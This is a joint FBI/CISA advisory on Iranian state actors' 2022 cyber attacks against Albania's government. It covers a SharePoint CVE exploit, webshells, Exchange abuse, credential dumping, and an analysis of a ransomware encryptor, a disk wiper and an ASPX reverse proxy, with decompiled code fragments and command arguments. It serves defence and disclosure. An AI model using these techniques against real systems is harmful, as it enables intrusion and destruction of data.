Iranian State Actors Conduct Cyber Operations
Against the Government of Albania
SUMMARY
The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency
(CISA) are releasing this joint Cybersecurity Advisory to provide information on recent cyber
operations against the Government of Albania in July and September. This advisory provides a
timeline of activity observed, from initial access to execution of encryption and wiper attacks.
Additional information concerning files used by the actors during their exploitation of and cyber attack
against the victim organization is provided in Appendices A and B.
In July 2022, Iranian state cyber actors—identifying as “HomeLand Justice”—launched a destructive
cyber attack against the Government of Albania which rendered websites and services unavailable. A
FBI investigation indicates Iranian state cyber actors acquired initial access to the victim’s network
approximately 14 months before launching the destructive cyber attack, which included a
ransomware-style file encryptor and disk wiping malware. The actors maintained continuous network
access for approximately a year, periodically accessing and exfiltrating e-mail content.
Between May and June 2022, Iranian state cyber actors conducted lateral movements, network
reconnaissance, and credential harvesting from Albanian government networks. In July 2022, the
actors launched ransomware on the networks, leaving an anti-Mujahideen E-Khalq (MEK) message
on desktops. When network defenders identified and began to respond to the ransomware activity,
the cyber actors deployed a version of ZeroCleare destructive malware.
In June 2022, HomeLand Justice created a website and multiple social media profiles posting antiMEK messages. On July 18, 2022, HomeLand Justice claimed credit for the cyber attack on Albanian
government infrastructure. On July 23, 2022, Homeland Justice posted videos of the cyber attack on
their website. From late July to mid-August 2022, social media accounts associated with HomeLand
All organizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at
report@cisa.gov or (888) 282-0870 and/or to the FBI via your local FBI field. State, local, tribal, and territorial
(SLTT) organizations should report incidents to MS-ISAC (866-787-4722 or SOC@cisecurity.org). When
available, please include the following information regarding the incident: date, time, and location of the incident;
type of activity; number of people affected; type of equipment used for the activity; the name of the submitting
company or organization; and a designated point of contact.
This document is marked TLP:WHITE. Disclosure is not limited. Sources may use TLP:WHITE when information
carries minimal or no foreseeable risk of misuse, in accordance with applicable rules and procedures for public
release. Subject to standard copyright rules, TLP:WHITE information may be distributed without restriction.

Justice demonstrated a repeated pattern of advertising Albanian Government information for release,
posting a poll asking respondents to select the government information to be released by HomeLand
Justice, and then releasing that information—either in a .zip file or a video of a screen recording with
the documents shown.
In September 2022, Iranian cyber actors launched another wave of cyber attacks against the
Government of Albania, using similar TTPs and malware as the cyber attacks in July. These followed
closely after actions by Albania to publicly attribute the July cyber attacks and to severe diplomatic
ties with Iran.

TECHNICAL DETAILS
Initial access
Timeframe: Approximately 14 months before encryption and wiper attacks.
Details: Initial access was obtained via exploitation of an Internet-facing Microsoft SharePoint,
exploiting CVE-2019-0604.

Persistence and Lateral movement
Timeframe: Approximately several days to two months after initial compromise.
Details: After obtaining access to the victim environment, the actors used several .aspx webshells,
pickers.aspx, error4.aspx, ClientBin.aspx, to maintain persistence. During this
timeframe, the actors also used RDP (primarily), SMB, and FTP for lateral movement throughout the
victim environment.

Exchange Server compromise
Timeframe: Approximately 1-6 months after initial compromise.
Details: The actors used a compromised Microsoft Exchange account to run searches (via CmdLets
New-MailboxSearch and Get-Recipient) on various mailboxes, including for administrator accounts. In
this timeframe, the actors used the compromised account to create a new Exchange account and add
it to the Organization Management role group.

Likely Email exfiltration
Timeframe: Approximately 8 months after initial compromise.
Details: The actors made thousands of HTTP POST requests to Exchange servers of the victim
organization. The FBI observed the client transferring roughly 70-160 MB of data, and the server
transferring roughly 3-20 GB of data.

VPN activity
Timeframe: Approximately 12-14 months after initial compromise.
Details: Approximately twelve months after initial access and two months before launching the
destructive cyber attack, the actors made connections to IP addresses belonging to the victim
organization’s Virtual Private Network (VPN) appliance. The actors’ activity primarily involved two
compromised accounts. The actors executed the “Advanced Port Scanner”
(advanced_port_scanner.exe). The FBI also found evidence of Mimikatz usage and LSASS dumping.

File Cryptor (ransomware-style file encryptor)
Timeframe: Approximately 14 months after initial compromise.
Details: For the encryption component of the cyber attack, the actor logged in to a victim organization
print server via RDP and kicked off a process (Mellona.exe) which would propagate the GoXml.exe
encryptor to a list of internal machines, along with a persistence script called win.bat. As deployed,
GoXML.exe encrypted all files (except those having extensions .exe, .dll, .sys, .lnk, or .lck) on the
target system, leaving behind a ransom note titled How_To_Unlock_MyFiles.txt in each folder
impacted.

Wiper attack
Timeframe: Approximately 14 months after initial compromise.
Details: In the same timeframe as the encryption attack, the actors began actions that resulted in raw
disk drives being wiped with the Disk Wiper tool (cl.exe) described in Appendix A. Approximately over
the next eight hours, numerous RDP connections were logged from an identified victim server to other
hosts on the victim’s network. Command line execution of cl.exe was observed in cached bitmap files
from these RDP sessions on the victim server.

MITIGATIONS
•

Ensure anti-virus and anti-malware software is enabled and signature definitions are updated
regularly and in a timely manner. Well-maintained anti-virus software may prevent use of
commonly deployed cyber attacker tools that are delivered via spear-phishing.

•

Adopt threat reputation services at the network device, operating system, application, and
email service levels. Reputation services can be used to detect or prevent low-reputation
email addresses, files, URLs, and IP addresses used in spear-phishing attacks.

•

If your organization is employing certain types of software and appliances vulnerable to known
Common Vulnerabilities and Exposures (CVEs), ensure those vulnerabilities are patched.
Prioritize patching known exploited vulnerabilities.

TLP:WHITE
•

Monitor for unusually large amounts of data (i.e. several GB) being transferred from a
Microsoft Exchange server.

•

Check the host-based indications, including webshells, for positive hits within your
environment.

Additionally, FBI and CISA recommend organizations apply the following best practices to reduce risk
of compromise:
•
•

•

•

Maintain and test an incident response plan.
Ensure your organization has a vulnerability management program in place and that it
prioritizes patch management and vulnerability scanning of known exploited vulnerabilities.
Note: CISA’s Cyber Hygiene Services (CyHy) are free to all state, local, tribal, and territorial
(SLTT) organizations, as well as public and private sector critical infrastructure organizations.
Properly configure and secure internet-facing network devices.
o Do not expose management interfaces to the internet.
o Disable unused or unnecessary network ports and protocols.
o Disable/remove unused network services and devices.
Adopt zero-trust principles and architecture, including:
o Micro-segmenting networks and functions to limit or block lateral movements.
o Enforcing phishing-resistant multifactor authentication (MFA) for all users and VPN
connections.
o Restricting access to trusted devices and users on the networks.

Appendix B
Ransomware Cryptor
GoXML.exe is a ransomware style file encryptor. It is a Windows executable, digitally signed with a
certificate issued to the Kuwait Telecommunications Company KSC, a subsidiary of Saudi
Telecommunications Company (STC).
If executed with five or more arguments (the arguments can be anything, as long as there are five or
more), the program silently engages its file encryption functionality. Otherwise, a file-open dialog
Window is presented, and any opened documents receive an error prompt labeled, Xml Form
Builder.
All internal strings are encrypted with a hard coded RC4 key. Before internal data is decrypted, the
string decryption routine has a built-in self-test that decrypts a DWORD value and tests to see if the
plaintext is the string yes. If so, it will continue to decode its internal strings.
The ransomware will attempt to launch the following batch script; however, this will fail due to a
syntax error.

All organizations should report incidents and anomalous activity to CISA’s 24/7 Operations Center at
report@cisa.gov or (888) 282-0870 and/or to the FBI via your local FBI field. State, local, tribal, and territorial
(SLTT) organizations should report incidents to MS-ISAC (866-787-4722 or SOC@cisecurity.org). When
available, please include the following information regarding the incident: date, time, and location of the incident;
type of activity; number of people affected; type of equipment used for the activity; the name of the submitting
company or organization; and a designated point of contact.

The syntax error consists of a missing backslash that separates system32 and cmd.exe, so the
process is launched as system32cmd.exe which is an invalid command.

Script Launch Bug
The ransomware’s file encryption routine will generate a random string, take the MD5 hash and use
that to generate an RC4 128 key which is used to encrypt files. This key is encrypted with a hard
coded Public RSA key and converted to Base64 utilizing a custom alphabet. This is appended to the
end of the ransom note.
The cryptor places a file called How_To_Unlock_MyFiles.txt in directories with encrypted files.
Each encrypted file is given the .lck extension and the contents of each file are only encrypted up
to 0x100000 or 1,048,576 bytes which is a hard coded limit.
Separately, the actor ran a batch script (win.bat below) to set a specific desktop background.

Disk Wiper
The files cl.exe and rwdsk.sys are part of a disk wiper utility that provides raw access to the hard
drive for the purposes of wiping data. From the command line the cl.exe file accepts the arguments:
•
in
•
un
•
wp <optional argument>
If executed with the in command, the utility will output in start! and installs a hard coded file
named rwdsk.sys as a service named RawDisk3. The .SYS file is not extracted from the installer
however, but rather the installer looks for the file in the same directory that the cl.exe is executed in.

It will also load the driver after installation.

The un command uninstalls the service, outputting the message “un start!” to the terminal.
The wp command will access the loaded driver for raw disk access.
Raw Disk Access
The long hexadecimal string is hard coded in the cl.exe binary.
RawDisk3File = (void *)toOpenRawDisk3File(
arg2_WideCharStr,
0xC0000000,

ptrRawDiskFile = RawDisk3File;
if ( RawDisk3File )
{
sizeDisk = toGetDiskSize(RawDisk3File);
terminal_out("Total Bytez : %lld\n", sizeDisk << 9);

The wp command also takes an additional argument as a device path to place after \RawDisk3\ in
the output string. It is uncertain what creates this path to a device as the driver tested did not.
The output is “wp starts!” followed by the total bytes of the drive and the time the wipe operation
takes.
If the registry key value HKLM\SOFTWARE\EldoS\EventLog is set to “Enabled”, the install will
generate an event log if at any time the install produces an error. This log contains an error code
DWORD followed by the string ..\..\DriverLibraries\DrvSupLib\install.c. If the system does not have the
SOFTWARE\EldoS key, no event logs would be produced. This feature must be a related to the
legitimate EldoS utility.

rwdsk.sys is a “legitimate commercial driver from the EldoS Corporation that is used for interacting
with files, disks, and partitions. The driver allows for direct modification of data on a local computer’s
hard drive. In some cases, the tool can enact these raw disk modifications from user-mode
processes, circumventing Windows operating system security features.” 3

Web Deployed Reverse Proxy
Description
ClientBin.aspx is an ASP file that contains a Base64 encoded .Net executable
(App_Web_bckwssht.dll) that it decodes and loads via Reflection. The .Net executable contains Class
and Method obfuscation and internal strings are encoded with a single byte XOR obfuscation.
public static string hair_school_bracket()
{
return Umbrella_admit_arctic.rebel_sadreporthospital("460F2830272A2F2266052928202F21661627252D27212368
"); //Invalid Config Package.
}
public static string Visual_math_already()
{
return Umbrella_admit_arctic.rebel_sadreporthospital("5304057E0116001607"); //WV-RESET

The method rebel_sadreporthospital takes the first byte of the encoded string and XOR’s each
subsequent byte to produce the de-obfuscated string.
When run in context of an IIS web server connecting to the ASPX file will generate a 200 <Encryption
DLL Info> 1.5 output.

Initial connection
The hex string represents the following ASCII text:
Base64, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null

Sending a POST request with a Base64 encoded IP and port will open a second socket to the
supplied IP and port making this a Web proxy.

Second Socket Opened from POST Request
Sending a request to WV-RESET with a value will produce an OK response and call a function to shut
down the proxy socket.

Terminate socket
The DLL extracts a secondary “EncryptionDLL” named Base64.dll which is loaded via
Assembly.Load. This exposes two functions, encrypt and decrypt. This DLL is used to decrypt the
Proxy IP and port along with data. In this instance the class name is misspelled Bsae64, which is also
reflected in the calling DLLs decoded strings. It is uncertain as to why an additional Base64.dll binary
is extracted when the same encoding could be hard coded in the original DLL. It is possible other
versions of this tool utilize differing “EncryptionDLL” binaries.
